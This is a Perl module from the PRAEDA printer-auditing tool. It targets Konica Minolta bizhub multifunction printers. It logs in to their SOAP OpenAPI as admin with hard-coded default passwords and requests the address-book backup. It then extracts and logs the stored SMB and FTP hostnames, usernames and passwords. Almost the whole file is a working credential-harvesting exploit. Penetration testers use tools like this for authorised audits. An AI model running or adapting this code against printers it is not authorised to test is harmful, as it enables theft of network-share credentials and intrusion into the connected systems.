# Minolta Konica Bizhub
######################################################
#                PRAEDA Module #MP0020               #
#                  Copyright (C) 2014                #
#              Deral 'percent_x' Heiland             #
######################################################
package MP0020;
sub MP0020
{
use Switch;

# Set global variables
my $count = 1;
my $TARGET = $_[1];
my $PORTS = $_[2];
my $web = $_[3];
my $OUTPUT = $_[4];
my $LOGFILE = $_[5];
my $data3 = $_[7];
my $key = "";
my $major = "";
my $minor = "";
my $port = "50001";

# Open output file for loging
open(OUTFILE, ">>./$OUTPUT/$LOGFILE.log") || die("Failed to open  Output file $OUTPUT \n");
     print "\n**********Attempting credential extraction from $data3 $TARGET : JOB MP0020**********\n";
     print OUTFILE "\n**********Attempting credential extraction from $data3 $TARGET : JOB MP0020**********\n";
my $browser = LWP::UserAgent->new();

# call port check subroutine----------------------------------------------------
        my ( $status ) =
        check_port( $TARGET, $port );
if ( $status == $SOCKET_IS_UP )
     {
      $PORTS = "50001";
      $web = "";
     }
else
     {
      # call port check subroutine check for ssl port
      my ( $status ) =
      check_port( $TARGET, 50003 );
      if ( $status == $SOCKET_IS_UP )
        {
         $PORTS = "50003";
         $web = "s";
        }
      else
        {
         print "Connection FAILED"
        }
     }

# validate printer model and set password---------------------------------------
switch( $data3 ){
   case "KONICA MINOLTA bizhub C554"   { $pwd = "1234567812345678" }
   case "KONICA MINOLTA bizhub C284e"  { $pwd = "1234567812345678" }
   else { $pwd = "12345678" }
  }

# Identify Soap Major and Minor versions----------------------------------------
my $generror ='<SOAP-ENV:Envelope
               </SOAP-ENV:Envelope>';

my $userAgent = LWP::UserAgent->new();
my $request = HTTP::Request->new(POST => "http$web://$TARGET:$PORTS/OpenAPI");
$request->content($generror);
my $response = $userAgent->request($request);

#parse response data for Major Minor version numbers
if($response->code == 500)
{
  my $xml_string = $response->as_string;

        foreach my $chunk (split(/<e:Envelope/,$xml_string))
               {
                ($major)=($chunk=~m|<Major>(.*)</Major>\s*|);
                ($minor)=($chunk=~m|<Minor>(.*)</Minor>\s*|);
               }
}

my $userAgent = LWP::UserAgent->new();

# Sending XML auth data to return AuthKey---------------------------------------

my $message ="<SOAP-ENV:Envelope
	       xmlns:SOAP-ENV='http://schemas.xmlsoap.org/soap/envelope/'
               xmlns:SOAP-ENC='http://schemas.xmlsoap.org/soap/encoding/'
               xmlns:xsi='http://www.w3.org/2001/XMLSchema-instance'
               xmlns:xsd='http://www.w3.org/2001/XMLSchema'>
               <SOAP-ENV:Header><me:AppReqHeader
               xmlns:me='http://www.konicaminolta.com/Header/OpenAPI-$major-$minor'>
               <ApplicationID xmlns=''>0</ApplicationID>
               <UserName xmlns=''></UserName>
               <Password xmlns=''></Password>
               <Version xmlns=''>
               <Major>$major</Major>
               <Minor>$minor</Minor>
               </Version>
               <AppManagementID xmlns=''>0</AppManagementID>
               </me:AppReqHeader></SOAP-ENV:Header>
               <SOAP-ENV:Body><AppReqLogin xmlns='http://www.konicaminolta.com/service/OpenAPI-$major-$minor'>
               <OperatorInfo><UserType>Admin</UserType><Password>$pwd</Password></OperatorInfo>
               <TimeOut>60</TimeOut>
               </AppReqLogin>
               </SOAP-ENV:Body>
               </SOAP-ENV:Envelope>";

my $userAgent = LWP::UserAgent->new();
my $request = HTTP::Request->new(POST => "http$web://$TARGET:$PORTS/OpenAPI");
$request->content($message);
# print $request->content($message);
my $response = $userAgent->request($request);

#parse response data for AuthKey
if($response->code == 200) 
{
  print "Default credintials enabled admin/$pwd\n";
  print OUTFILE "SUCCESS:Konica: Default credintials enabled admin/$pwd\n";
  my $xml_string = $response->as_string;

	foreach my $chunk (split(/<e:Envelope/,$xml_string))
               {
                ($key)=($chunk=~m|<AuthKey>(.*)</AuthKey>\s*|);
               }
# Sending XML password information extract request------------------------------

	my $message1 ="<SOAP-ENV:Envelope
        	        xmlns:SOAP-ENV='http://schemas.xmlsoap.org/soap/envelope/'
                	xmlns:SOAP-ENC='http://schemas.xmlsoap.org/soap/encoding/'
               		xmlns:xsi='http://www.w3.org/2001/XMLSchema-instance'
               	 	xmlns:xsd='http://www.w3.org/2001/XMLSchema'>
                	<SOAP-ENV:Header><me:AppReqHeader
                	xmlns:me='http://www.konicaminolta.com/Header/OpenAPI-$major-$minor'>
                	<ApplicationID xmlns=''>0</ApplicationID>
                	<UserName xmlns=''></UserName>
                	<Password xmlns=''></Password>
                	<Version xmlns=''><Major>$major</Major>
                	<Minor>$minor</Minor></Version>
                	<AppManagementID xmlns=''>1000</AppManagementID>
                	</me:AppReqHeader></SOAP-ENV:Header>
                	<SOAP-ENV:Body><AppReqGetAbbr xmlns='http://www.konicaminolta.com/service/OpenAPI-$major-$minor'>
                	<OperatorInfo>
                	<AuthKey>$key</AuthKey>
                	</OperatorInfo><AbbrListCondition>
                	<SearchKey>None</SearchKey>
                	<WellUse>false</WellUse>
                	<ObtainCondition>
                	<Type>OffsetList</Type>
                	<OffsetRange><Start>1</Start><Length>100</Length></OffsetRange>
                	</ObtainCondition>
                	<BackUp>true</BackUp>
                	<BackUpPassword>MYSKIMGS</BackUpPassword>
                	</AbbrListCondition></AppReqGetAbbr>
                	</SOAP-ENV:Body></SOAP-ENV:Envelope>";

	my $userAgent = LWP::UserAgent->new();
	my $request = HTTP::Request->new(POST => "http$web://$TARGET:$PORTS/OpenAPI");
	$request->content($message1);
	my $response = $userAgent->request($request);

	#parse response data for FTP and SMB credintial
	if($response->code == 200)
	{
  	my $xml_string1 = $response->as_string;
# print "$xml_string1\n";
  	print "Starting SMB & FTP Credentials Extract \n";     
              foreach my $chunk (split(/<SendMode>/,$xml_string1))
        	{
               	 ($smbmode)=($chunk=~m|<SmbMode>(.*)</SmbMode>\s*|);
               	 ($ftpmode)=($chunk=~m|<FtpServerMode>(.*)</FtpServerMode>\s*|);
                   if ($smbmode =~ /Host/)
                     {
                      ($host)=($chunk=~m|<Host>(.*)</Host>|);
                      ($user)=($chunk=~m|<User>(.*)</User>|);
                      ($pwd)=($chunk=~m|<Password>(.*)</Password>|);
                      ($fldr)=($chunk=~m|<Folder>(.*)</Folder>|);
                      print OUTFILE "SUCCESS:Konica:SMB: Host=$host: Username=$user: Password=$pwd: Folder=$fldr\n";
                     }
                   elsif ($ftpmode =~ /Address/)
                     {  
                      ($user)=($chunk=~ m|<User>(.*)</User>|);
                      ($pwd)=($chunk=~ m|<Password>(.*)</Password>|);
                      ($fldr)=($chunk=~ m|<Folder>(.*)</Folder>|);
                      ($addr)=($chunk=~ m|<Address>(.*)</Address>|);
                      ($prtn)=($chunk=~ m|<PortNo>(.*)</PortNo>|);
                      ($anon)=($chunk=~ m|<Anonymous>(.*)</Anonymous>|);
                      print OUTFILE "SUCCESS:Konica:FTP: Host=$addr: Username=$user: Password=$pwd: Folder=$fldr: Port=$prtn: Anonymous=$anon\n";
                     }
               }
	}
	else
	{
	  print $response->error_as_HTML;
	}


}
elsif($response->code == 500)
{
  print "Default password hash been changed\n";
}
else 
{
  print $response->error_as_HTML;
}

# operation completed close out output files
close(OUTFILE);


# port check sub routeen-------------------------------------------------------
 sub check_port {
  my ( $TARGET ) = @_;
  my $status = $SOCKET_IS_DOWN;
  my $socket = IO::Socket::INET->new(
    PeerAddr => $TARGET,
    PeerPort => $port,
    Timeout => $REQUEST_TIMEOUT
    );


 if ( defined $socket )
     {
      sleep $WAIT_FOR_RST;
      my $is_connected = $socket->connected;

         if ( defined $is_connected )
            {
            $status = $SOCKET_IS_UP;
            }
     }
return ( $status);
}

}
1;
